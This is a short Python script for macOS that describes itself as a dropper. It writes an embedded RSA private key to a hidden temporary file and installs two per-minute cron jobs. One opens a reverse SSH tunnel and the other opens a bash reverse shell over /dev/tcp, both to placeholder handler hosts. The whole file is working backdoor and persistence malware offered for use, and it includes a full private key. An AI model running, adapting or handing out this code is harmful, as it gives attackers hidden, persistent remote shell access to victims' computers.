#!/usr/bin/python

""" simple python dropper for OSX to spawn both a reverse
ssh session and reverse shell with bash via a few crontabs.
binding ports are randomly decided during execution """

from random import randint
import getpass
import os

privkey = """-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEArA9quD0OfDh5XA0hA5NE+GOHluXwC5a8PNp6Pi+rPePG4zL1
fOSBDZjOeAv9uT/xieDDxesxIObKafDgHKe8+Lp996vJ09M3dSUZwB/9ye6i/5Ne
4bm8tDR8OB8yLIRbd/HFzx1qdz7N+7G8jp6tDjTYCwMKXl0vrtwmSRh9peoxLUIX
tWJ+1fGDvm7smX5njfbnl/z7tPxJWnsw3FNJdLSuIXHPa/RItMYv4caw7fCDoIIx
faw5jbfjPg6mIFzlPk/EjwU1x14378ROGaXFjg9tYIz2j6Z1BSneLcvLtlW3Lim0
UdwcT2shlv+FryeRFlQjVCemFTWsdiZHW8BGrwIDAQABAoIBABasQWfdw9biqjtT
D5KlCWWh1/AuhJ9CUbPDJnCjX3FcXoz53heDFO5xwGNZUSnkHzQIBkRCZcrsHqgv
MZkVEXXFPWwxmvrqzlgFd4s1q/+8DoaXKN2d2Bv2/pd2pOnw1wzLM0HDoo/sGsCb
/zjb9/nzRLTOxcMBjJMCN5lSPNxr9ISkjYMZF2xztPVf1uAa8bbiCuoDOu9dUqKS
H1t/0GYevBI3wv7l3dEHJYNBSnTrJSwwvPt2n2IzI8ilsKXW7E5neVARCWNr1nqu
xpNJmZvFfdPCu3ABJIPE29929xb1hBWU3myqvvkg219np75MDnBtRZvLY+EK8etw
OQ2LfAECgYEA3NayNlNwzvD7S04MQge0iQJzfNHsVnH+4s/pD0s5crvlgwJLuPUj
Rc2lDdC8O9fezNOcTkI5h6R5qT+hXIi7WXVu1OxfD8YWHMqBHkaDy8RtodyLiP83
p+vQfaUBUZUu2mxnTSyjaaa8IlmELWAl9/Zuzwa6y05g8/0bwcEwii8CgYEAx3SH
hDG54gFTnVAcG5JT1bdkiOPDbRl7RCh898foCnstQDMS9iIhJVJo6cqkygmwqLW4
M7zSxgtRQhArUn/PfSkqsncQHCZb2flaY9E699mMKs/B5Xq3eKXRYk2oQJB5avQB
mjR7lX5boASYa7Jgb19XVisCYqYjuKOp/RLHa4ECgYBDHEuUDs9dVAZJ4DIBbu4C
JOiLqg+0RXg73QrqRuXyY/9fTLdOQdCyScg65pANb5CZlkUN0zpAak8+i8Oxpyuo
B/PiaOKKnJvjq/aJCMzMg6j9Y1RUEZsMQLFfPWGlNTzDy+WookQWu0C4/5MXZvyi
2hTafSUO24bDHsvsmZTyqQKBgFEeZZcwGid+3qDWWfgktQ/wfGToLS0L9gQsa1bi
6M6Kdkbr/sQ38T8amyyqjAbXlg+niHkSTK7bH3s81EHDVYHT4lee8OBiAW1PaqG6
EL+IrOckg/luxXu+BMB0UP+hQqBrCNPMkI6mS2FzPQJgE7R4FC8pYtj4NQL9HT+e
CZkBAoGAUl1NDYY2iBtm/zWMg8owaSXj9B6grpAlK07OJl009219iiHsfCZS1PL+
+nKarK47QS1zAtGuL+w9hMJNtJ7BTMA4NNnBvLdaBdT/4bUFSETXMTj0Ui4kunqV
hMzHWhMWQ9OlAUgDL/qNVUqDWyssX0UxwOpyg9FSIHo41o+bZcQ=
-----END RSA PRIVATE KEY-----
"""

""" save our private key """
username = getpass.getuser()
key = "/tmp/.pk"
with open( key, "w" ) as f:
    f.write( privkey )
f.close()
os.system( "chmod 600 {}".format( key ) )

""" install crontabs """
newcron = "/tmp/.cron"
port = str( randint( 1000, 9999 ) )
sshcmd = "[ -z $( pidof ssh ) ] && ssh -i {} -fN -R {}:localhost:443 slave@___SSH_HANDLER___".format( key, port )
bashcmd = "bash -i >& /dev/tcp/___NC_HANDLER___/80 0>&1"
revssh = "*/1 * * * * {}\n".format( sshcmd )
revbash = "*/1 * * * * {}\n".format( bashcmd )
crons = [ x for x in os.popen( "crontab -l" ) ]
crons.append( revssh )
crons.append( revbash )
with open( newcron, "w" ) as f:
    for cron in crons:
        print "[>] Installing => {}".format( cron )
        f.write( "{}".format( cron ) )
f.close()
os.system( "crontab {}".format( newcron ) )
print "[+] Done"
